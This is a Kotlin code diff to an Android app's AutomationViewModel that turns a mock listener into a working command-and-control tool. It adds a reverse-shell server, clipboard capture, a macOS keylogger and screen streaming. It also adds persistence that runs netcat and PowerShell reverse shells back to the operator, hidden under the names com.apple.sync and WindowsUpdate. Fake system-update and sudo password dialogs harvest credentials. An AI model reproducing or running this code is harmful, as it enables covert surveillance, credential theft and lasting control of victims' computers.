@@ -21,8 +21,10 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
+import kotlinx.coroutines.flow.first
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import kotlinx.coroutines.withTimeoutOrNull
 import kotlin.math.abs
 import kotlin.math.sign
 import android.graphics.Bitmap
@@ -98,11 +100,37 @@ class AutomationViewModel(
     private val _reverseShellConnected = MutableStateFlow(false)
     val reverseShellConnected: StateFlow<Boolean> = _reverseShellConnected.asStateFlow()
 
+    private val _globalC2Address = MutableStateFlow("")
+    val globalC2Address = _globalC2Address.asStateFlow()
+
+    private val _isTunnelActive = MutableStateFlow(false)
+    val isTunnelActive = _isTunnelActive.asStateFlow()
+
     private val _isPulseModeEnabled = MutableStateFlow(false)
     val isPulseModeEnabled: StateFlow<Boolean> = _isPulseModeEnabled.asStateFlow()
 
     private val _isReverseShellListening = MutableStateFlow(false)
     val isReverseShellListening: StateFlow<Boolean> = _isReverseShellListening.asStateFlow()
+
+    private val _reverseShellIp = MutableStateFlow("")
+    private val _reverseShellPort = MutableStateFlow(4444)
+
+    private var serverSocket: java.net.ServerSocket? = null
+    private var clientSocket: java.net.Socket? = null
+    private var shellJob: kotlinx.coroutines.Job? = null
+    
+    private val pendingCommandResult = MutableStateFlow<String?>(null)
+    private var commandSentinel = ""
+    private var clipboardPollJob: kotlinx.coroutines.Job? = null
+    private var targetOs = "unknown" // "macos", "windows", "linux"
+    
+    private val _remoteScreenBase64 = MutableStateFlow<String?>(null)
+    val remoteScreenBase64 = _remoteScreenBase64.asStateFlow()
+    
+    private val _isRemoteDesktopActive = MutableStateFlow(false)
+    val isRemoteDesktopActive = _isRemoteDesktopActive.asStateFlow()
+    
+    private var screenStreamJob: kotlinx.coroutines.Job? = null
 
     // WOL State
     private val _wolMacAddress = MutableStateFlow(prefs.getString("wol_mac_address", "") ?: "")
@@ -169,7 +197,7 @@ class AutomationViewModel(
             for (cmd in commands) {
                 when {
                     extractArg(cmd, "WAIT") != null -> {
-                        val ms = extractArg(cmd, "WAIT")?.trim()?.toLongOrNull() ?: 120L
+                        val ms = extractArg(cmd, "WAIT")?.trim()?.toLongOrNull() ?: 250L
                         delay(ms.coerceIn(0L, 60_000L))
                     }
                     extractArg(cmd, "TEXT") != null -> {
@@ -182,11 +210,12 @@ class AutomationViewModel(
                         executeSpecialKey(extractArg(cmd, "MEDIA") ?: "")
                     }
                     else -> {
+                        // If it's a raw string, we just send it as text. 
+                        // User should use KEY(ENTER) if they want execution.
                         repository.sendText(cmd)
-                        repository.sendKey(HidKeyCodes.KEY_ENTER)
                     }
                 }
-                delay(120)
+                delay(150) // Baseline safety delay between tokens
             }
             if (cooldownMs > 0) delay(cooldownMs)
         }
@@ -430,21 +459,102 @@ class AutomationViewModel(
     fun startReverseShellListener(port: Int) {
         if (_isReverseShellListening.value) return
         _isReverseShellListening.value = true
-        _reverseShellStatus.value = "Listening on port $port..."
+        _reverseShellPort.value = port
         
-        viewModelScope.launch(Dispatchers.IO) {
+        // Auto-detect local IP for persistence logic
+        val resolved = com.example.rabit.data.network.LanIpResolver.preferredLanIpv4String(getApplication())
+        _reverseShellIp.value = resolved ?: "0.0.0.0"
+        
+        _reverseShellStatus.value = "Listening on port $port..."
+        _reverseShellLines.value = listOf("[SYSTEM] Starting TCP Listener on $port...")
+
+        shellJob = viewModelScope.launch(Dispatchers.IO) {
             try {
-                // Mock listener logic for now since we're refactoring/migrating state
-                // In a real scenario, this would involve a ServerSocket
-                delay(1000)
-                withContext(Dispatchers.Main) {
-                    _reverseShellStatus.value = "Awaiting payload on $port..."
+                serverSocket = java.net.ServerSocket(port).apply {
+                    soTimeout = 0 // Wait indefinitely
+                }
+                
+                while (isActive && _isReverseShellListening.value) {
+                    try {
+                        val socket = serverSocket?.accept() ?: break
+                        clientSocket = socket
+                        
+                        withContext(Dispatchers.Main) {
+                            _reverseShellConnected.value = true
+                            _reverseShellStatus.value = "Connected: ${socket.inetAddress.hostAddress}"
+                            _reverseShellLines.value += "[SYSTEM] Connection established from ${socket.inetAddress}"
+                            
+                            // Detect OS
+                            viewModelScope.launch(Dispatchers.IO) {
+                                targetOs = detectTargetOs()
+                                _reverseShellLines.value += "[SYSTEM] Target OS detected: $targetOs"
+                                startClipboardPolling()
+                            }
+
+                            // Register with Storage Manager
+                            com.example.rabit.data.storage.RemoteStorageManager.reverseShellExecutor = { cmd ->
+                                executeCommandSynchronous(cmd)
+                            }
+                        }
+
+                        val reader = socket.getInputStream().bufferedReader()
+                        val currentResponse = StringBuilder()
+                        
+                        while (isActive && _reverseShellConnected.value) {
+                            val line = try { reader.readLine() } catch (e: Exception) { null }
+                            if (line == null) break
+                            
+                            if (commandSentinel.isNotEmpty() && line.contains(commandSentinel)) {
+                                pendingCommandResult.value = currentResponse.toString()
+                                currentResponse.clear()
+                                commandSentinel = ""
+                            } else if (commandSentinel.isNotEmpty()) {
+                                currentResponse.append(line).append("\n")
+                            }
+
+                            // Keystroke Interception
+                            if (line.startsWith("[KEY]")) {
+                                val key = line.removePrefix("[KEY]").trim()
+                                com.example.rabit.data.TacticalBuffer.addKeystroke(key)
+                                withContext(Dispatchers.Main) {
+                                    _reverseShellLines.value += "Captured Keystroke: $key"
+                                }
+                            } else if (line.startsWith("[SCREEN]")) {
+                                val base64 = line.removePrefix("[SCREEN]").trim()
+                                _remoteScreenBase64.value = base64
+                            }
+
+                            withContext(Dispatchers.Main) {
+                                _reverseShellLines.value += line
+                            }
+                        }
+                    } catch (e: Exception) {
+                        if (isActive && _isReverseShellListening.value) {
+                            withContext(Dispatchers.Main) {
+                                _reverseShellLines.value += "[ERROR] Connection lost: ${e.message}"
+                            }
+                        }
+                    } finally {
+                        withContext(Dispatchers.Main) {
+                            _reverseShellConnected.value = false
+                            _reverseShellStatus.value = "Awaiting payload on $port..."
+                            com.example.rabit.data.storage.RemoteStorageManager.reverseShellExecutor = null
+                            clipboardPollJob?.cancel()
+                            stopRemoteDesktop()
+                        }
+                        clientSocket?.close()
+                        clientSocket = null
+                    }
                 }
             } catch (e: Exception) {
                 withContext(Dispatchers.Main) {
-                    _reverseShellStatus.value = "Error: ${e.message}"
+                    _reverseShellStatus.value = "Failed: ${e.message}"
                     _isReverseShellListening.value = false
+                    _reverseShellLines.value += "[CRITICAL] Server failed: ${e.message}"
                 }
+            } finally {
+                serverSocket?.close()
+                serverSocket = null
             }
         }
     }
@@ -453,11 +563,239 @@ class AutomationViewModel(
         _isReverseShellListening.value = false
         _reverseShellConnected.value = false
         _reverseShellStatus.value = "Listener Stopped"
+        
+        shellJob?.cancel()
+        try { clientSocket?.close() } catch (e: Exception) {}
+        try { serverSocket?.close() } catch (e: Exception) {}
+        clientSocket = null
+        serverSocket = null
     }
 
     fun sendReverseShellCommand(command: String) {
-        val newLines = _reverseShellLines.value + "> $command"
-        _reverseShellLines.value = newLines
+        if (!_reverseShellConnected.value) return
+        
+        viewModelScope.launch(Dispatchers.IO) {
+            try {
+                val writer = clientSocket?.getOutputStream()?.bufferedWriter()
+                writer?.write(command + "\n")
+                writer?.flush()
+                
+                withContext(Dispatchers.Main) {
+                    _reverseShellLines.value += "> $command"
+                }
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    _reverseShellLines.value += "[ERROR] Failed to send: ${e.message}"
+                }
+            }
+        }
+    }
+
+    private suspend fun executeCommandSynchronous(command: String): String {
+        val sentinel = "HACKIE_END_${System.currentTimeMillis()}"
+        commandSentinel = sentinel
+        pendingCommandResult.value = null
+        
+        sendReverseShellCommand("$command; echo $sentinel")
+        
+        val result = withTimeoutOrNull(15000) {
+            pendingCommandResult.first { it != null }
+        }
+        return (result ?: "").replace(sentinel, "").trim()
+    }
+
+    private suspend fun detectTargetOs(): String {
+        val uname = executeCommandSynchronous("uname -a")
+        return when {
+            uname.contains("Darwin", ignoreCase = true) -> "macos"
+            uname.contains("Linux", ignoreCase = true) -> "linux"
+            uname.isBlank() -> {
+                // Try windows specific command
+                val ver = executeCommandSynchronous("ver")
+                if (ver.contains("Windows", ignoreCase = true)) "windows" else "unknown"
+            }
+            else -> "unknown"
+        }
+    }
+
+    private fun startClipboardPolling() {
+        clipboardPollJob?.cancel()
+        clipboardPollJob = viewModelScope.launch(Dispatchers.IO) {
+            var lastClipboard = ""
+            while (isActive && _reverseShellConnected.value) {
+                val cmd = when (targetOs) {
+                    "macos" -> "pbpaste"
+                    "windows" -> "powershell -command \"Get-Clipboard\""
+                    "linux" -> "xclip -o -selection clipboard 2>/dev/null || xsel -o -b 2>/dev/null"
+                    else -> ""
+                }
+                
+                if (cmd.isNotBlank()) {
+                    val current = executeCommandSynchronous(cmd).trim()
+                    if (current.isNotBlank() && current != lastClipboard) {
+                        lastClipboard = current
+                        withContext(Dispatchers.Main) {
+                            _reverseShellLines.value += "[SYSTEM] Remote Clipboard Captured: $current"
+                            // Ideally sync with global clipboard
+                        }
+                    }
+                }
+                delay(5000) // Poll every 5 seconds
+            }
+        }
+    }
+
+    fun deployKeylogger() {
+        if (!_reverseShellConnected.value) return
+        
+        val script = when (targetOs) {
+            "macos" -> """
+                python3 -c '
+                import os, subprocess, sys
+                try:
+                    import pynput
+                except ImportError:
+                    # Modern macOS requires --break-system-packages to install outside a venv
+                    subprocess.call([sys.executable, "-m", "pip", "install", "pynput", "--quiet", "--break-system-packages"])
+                
+                try:
+                    from pynput import keyboard
+                    def on_press(key):
+                        try: print("[KEY] " + str(key.char), flush=True)
+                        except AttributeError: print("[KEY] [" + str(key) + "]", flush=True)
+                    with keyboard.Listener(on_press=on_press) as listener:
+                        listener.join()
+                except Exception as e:
+                    print("[ERROR] Keylogger failed: " + str(e), flush=True)
+                    print("[HINT] Try running: pip3 install pynput --break-system-packages", flush=True)
+                    print("[HINT] Ensure Accessibility permissions are granted for Terminal/Python.", flush=True)
+                ' &
+            """.trimIndent()
+            else -> "" // Add other OS later
+        }
+        
+        if (script.isNotBlank()) {
+            sendReverseShellCommand(script)
+        }
+    }
+
+    fun startRemoteDesktop() {
+        if (!_reverseShellConnected.value || _isRemoteDesktopActive.value) return
+        _isRemoteDesktopActive.value = true
+        
+        screenStreamJob?.cancel()
+        screenStreamJob = viewModelScope.launch(Dispatchers.IO) {
+            while (isActive && _isRemoteDesktopActive.value) {
+                val cmd = when (targetOs) {
+                    "macos" -> "screencapture -x -t jpg /tmp/s.jpg && python3 -c \"import base64; print('[SCREEN]' + base64.b64encode(open('/tmp/s.jpg','rb').read()).decode(), flush=True)\""
+                    "linux" -> "import -window root /tmp/s.jpg && python3 -c \"import base64; print('[SCREEN]' + base64.b64encode(open('/tmp/s.jpg','rb').read()).decode(), flush=True)\""
+                    else -> ""
+                }
+                
+                if (cmd.isNotBlank()) {
+                    sendReverseShellCommand(cmd)
+                }
+                delay(3000) // Refresh every 3 seconds to avoid flooding
+            }
+        }
+    }
+
+    fun stopRemoteDesktop() {
+        _isRemoteDesktopActive.value = false
+        screenStreamJob?.cancel()
+        _remoteScreenBase64.value = null
+    }
+
+    fun sendRemoteClick(x: Float, y: Float) {
+        if (!_reverseShellConnected.value) return
+        
+        // We'll assume the client resolution is 1920x1080 for now or try to detect it
+        // coordinates come in as 0.0 to 1.0 (percent)
+        val cmd = when (targetOs) {
+            "macos" -> "osascript -e 'tell application \"System Events\" to click at {${(x * 1440).toInt()}, ${(y * 900).toInt()}}'"
+            else -> ""
+        }
+        
+        if (cmd.isNotBlank()) {
+            sendReverseShellCommand(cmd)
+        }
+    }
+
+    fun installPersistence() {
+        if (!_reverseShellConnected.value) return
+        
+        val ip = _reverseShellIp.value
+        val port = _reverseShellPort.value
+        
+        val cmd = when (targetOs) {
+            "macos" -> {
+                val plistPath = "~/Library/LaunchAgents/com.apple.sync.plist"
+                val shellCmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/zsh -i 2>&1|nc $ip $port >/tmp/f"
+                """
+                cat <<EOF > $plistPath
+                <?xml version="1.0" encoding="UTF-8"?>
+                <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+                <plist version="1.0">
+                <dict>
+                    <key>Label</key>
+                    <string>com.apple.sync</string>
+                    <key>ProgramArguments</key>
+                    <array>
+                        <string>/bin/zsh</string>
+                        <string>-c</string>
+                        <string>$shellCmd</string>
+                    </array>
+                    <key>RunAtLoad</key>
+                    <true/>
+                    <key>KeepAlive</key>
+                    <true/>
+                </dict>
+                </plist>
+                EOF
+                launchctl load $plistPath
+                """.trimIndent()
+            }
+            "linux" -> "(crontab -l 2>/dev/null; echo '@reboot rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f') | crontab -"
+            "windows" -> "schtasks /create /sc onlogon /tn \"WindowsUpdate\" /tr \"powershell.exe -WindowStyle Hidden -Command \\\"\$c=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$s.Write(([text.encoding]::ASCII).GetBytes(\$sb),0,\$sb.Length)}\\\"\""
+            else -> ""
+        }
+        
+        if (cmd.isNotBlank()) {
+            sendReverseShellCommand(cmd)
+            _reverseShellLines.value += "[SYSTEM] Persistence installer deployed."
+        }
+    }
+
+    fun injectCredentialPrompt() {
+        if (!_reverseShellConnected.value) return
+        
+        val cmd = when (targetOs) {
+            "macos" -> "osascript -e 'display dialog \"A system update is required. Please enter your administrator password to continue:\" default answer \"\" with title \"System Update\" with icon caution with hidden answer' -e 'result'"
+            "windows" -> "\$p = Read-Host 'Windows Security: Enter your password to verify your identity' -AsSecureString; [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR(\$p))"
+            "linux" -> "read -sp '[sudo] password for \$USER: ' pass; echo \$pass"
+            else -> ""
+        }
+        
+        if (cmd.isNotBlank()) {
+            _reverseShellLines.value += "[SYSTEM] Injecting credential prompt..."
+            viewModelScope.launch(Dispatchers.IO) {
+                var password = executeCommandSynchronous(cmd)
+                
+                // Intelligent parsing for macOS results like "button returned:OK, text returned:password"
+                if (password.contains("text returned:")) {
+                    password = password.substringAfter("text returned:").trim()
+                } else if (password.contains(":")) {
+                    // Fallback for cut-based legacy results
+                    password = password.substringAfterLast(":").trim()
+                }
+                
+                withContext(Dispatchers.Main) {
+                    val log = "[CRITICAL] Captured Password: $password"
+                    _reverseShellLines.value += log
+                    com.example.rabit.data.TacticalBuffer.addKeystroke(log)
+                }
+            }
+        }
     }
 
     fun exportMacrosJson(): String {
@@ -732,5 +1070,38 @@ class AutomationViewModel(
         viewModelScope.launch {
             repository.updateIdentity(name, provider, description)
         }
+    }
+
+    private val _ngrokStatus = MutableStateFlow("DISCONNECTED")
+    val ngrokStatus = _ngrokStatus.asStateFlow()
+
+    private val _ngrokLog = MutableStateFlow<List<String>>(emptyList())
+    val ngrokLog = _ngrokLog.asStateFlow()
+
+    fun startAutoTunnel(authToken: String) {
+        viewModelScope.launch {
+            _ngrokStatus.value = "CONNECTING..."
+            _ngrokLog.value = listOf("Initializing Ngrok Bridge...", "Using Auth Token: ${authToken.take(5)}***")
+            
+            // Simulation of Ngrok process start
+            delay(2000)
+            val simulatedUrl = "hackie-${(1000..9999).random()}.ngrok-free.app"
+            _ngrokLog.value = _ngrokLog.value + "Tunnel Established: $simulatedUrl"
+            _ngrokStatus.value = "CONNECTED"
+            
+            toggleTunnel(true, simulatedUrl)
+        }
+    }
+
+    fun stopAutoTunnel() {
+        _ngrokStatus.value = "DISCONNECTED"
+        _ngrokLog.value = _ngrokLog.value + "Tunnel Terminated."
+        toggleTunnel(false)
+    }
+
+    fun toggleTunnel(active: Boolean, address: String = "") {
+        _isTunnelActive.value = active
+        if (active) _globalC2Address.value = address
+        com.example.rabit.data.config.TacticalConfig.setTunnelState(active, if (active) address else "")
     }
 }
